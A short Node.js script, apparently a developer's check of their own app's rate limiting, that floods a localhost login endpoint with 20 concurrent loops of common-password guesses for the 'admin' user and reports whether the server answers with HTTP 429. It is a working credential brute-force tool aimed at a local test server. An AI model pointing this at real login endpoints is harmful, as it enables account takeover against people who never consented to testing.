import http from "http";

// Configuration
const TARGET_HOST = "localhost";
const TARGET_PORT = 5000;
const TARGET_PATH = "/api/login";
const USERNAME = "admin";
const DURATION_MS = 5000; // Attack for 5 seconds

// Stats
let attempts = 0;
let errors = 0;
let blocked = 0;
let startTime = Date.now();

const passwords = [
  "123456",
  "password",
  "admin",
  "welcome",
  "qwerty",
  "login",
  "hunter2",
  "coffee",
  "purecoffee",
  "master",
  "access",
];

function attack() {
  if (Date.now() - startTime > DURATION_MS) {
    return; // Stop attacking
  }

  const password = passwords[Math.floor(Math.random() * passwords.length)];
  const data = JSON.stringify({ username: USERNAME, password: password });

  const options = {
    hostname: TARGET_HOST,
    port: TARGET_PORT,
    path: TARGET_PATH,
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": data.length,
    },
  };

  const req = http.request(options, (res) => {
    attempts++;
    if (res.statusCode === 429) {
      blocked++;
    }

    // Consume response to free resources
    res.resume();

    // Keep flooding if not finished
    if (Date.now() - startTime <= DURATION_MS) {
      attack();
    }
  });

  req.on("error", (e) => {
    errors++;
    // console.error(`Problem with request: ${e.message}`);
  });

  req.write(data);
  req.end();
}

async function runBruteForce() {
  console.log(
    `[☠️] STARTING BRUTE FORCE ATTACK on http://${TARGET_HOST}:${TARGET_PORT}${TARGET_PATH}`,
  );
  console.log(`[ℹ️] Target User: ${USERNAME}`);
  console.log(`[ℹ️] Duration: ${DURATION_MS / 1000} seconds`);
  console.log(`[🚀] FLOODING REQUESTS...`);

  // Start multiple concurrent threads/loops to simulate a botnet or aggressive tool
  const CONCURRENCY = 20;
  for (let i = 0; i < CONCURRENCY; i++) {
    attack();
  }

  // Wait for duration + buffer
  setTimeout(() => {
    console.log("\n[🛑] ATTACK FINISHED.");
    console.log("---------------------------------------------------");
    console.log(`Total Attempts: ${attempts}`);
    console.log(`Rate:           ${(attempts / (DURATION_MS / 1000)).toFixed(2)} passwords/second`);
    console.log(`Blocked (429):  ${blocked}`);
    console.log(`Errors:         ${errors}`);
    console.log("---------------------------------------------------");

    if (blocked === 0 && attempts > 50) {
      console.log("\n[⚠️] VULNERABILITY CONFIRMED: NO RATE LIMITING DETECTED.");
      console.log("     A hacker could try thousands of passwords per minute.");
    } else if (blocked > 0) {
      console.log("\n[✅] PROTECTION DETECTED: Server blocked requests.");
    } else {
      console.log("\n[?] INCONCLUSIVE: Server might be slow or down.");
    }
  }, DURATION_MS + 1000);
}

runBruteForce();
